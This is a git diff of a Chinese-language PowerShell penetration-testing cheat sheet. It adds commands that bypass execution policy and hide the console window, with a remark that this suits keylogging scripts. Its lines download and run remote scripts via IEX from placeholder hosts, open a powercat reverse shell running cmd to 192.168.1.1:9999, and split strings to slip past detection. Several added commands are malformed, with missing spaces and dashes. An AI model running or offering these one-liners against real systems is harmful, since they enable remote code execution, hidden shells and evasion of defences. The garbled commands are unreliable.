@@ -46,10 +46,23 @@ $h=new-object System.Net.WebClient
 $h.DownloadFile('https://xxx.com/payload/shell/test.sh','C:\Users\xxx\Desktop\test\test.sh')
 ```
 
-## 命令行执行 ps1 文件
+## 命令行执行 ps1 文件 (绕过本地权限执行)
 
 ```powershell
 powershell.exe -ExecutionPolicy bypass -File "C:\Users\XX\Desktop\test\test.ps1"
+```
+
+ExecutionPolicy Bypass: 绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell 的安全策略规定了 PowerShell 不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全保护规则。在渗透测试中，基本每次运行 PowerShell 脚本时都要使用这个参数。
+* WindowStyle Hidden: 隐藏窗口。
+* NoLogo: 启动不显示版权标志的 PowerShell.
+* NonInteractive (-Nonl): 非交互模式，PowerShell 不为用户提供交互的提示。
+* NoProfile (-NoP): PowerShell 控制台不加载当前用户的配置文件。
+* Noexit: 执行后不退出 Shell。这在使用键盘记录等脚本时非常重要。
+
+## 本地隐藏绕过权限执行脚本
+
+```powershell
+PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden NoLogo -NonInteractive -NoProfile File "test.ps1"
 ```
 
 ## 远程下载并执行
@@ -62,9 +75,14 @@ powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('ht
 powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.1.1/1/powercat.ps1'); powercat -c 192.168.1.1 -p 9999 -e cmd
 ```
 
+**将命令拆分为字符串，然后进行拼接**
 ```powershell
-# 将命令拆分为字符串，然后进行拼接
 powershell "$a='IEX(New-Object Net.WebClient).Downlo';$b='11(''https://xxx.com/payload/test/test.ps1'')'.Replace('11','adString');IEX ($a+$b)"
+```
+
+**用IEX下载远程PS1脚本绕过权限执行**
+```powershell
+PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString("test.ps1");[Parameters]
 ```
 
 ---
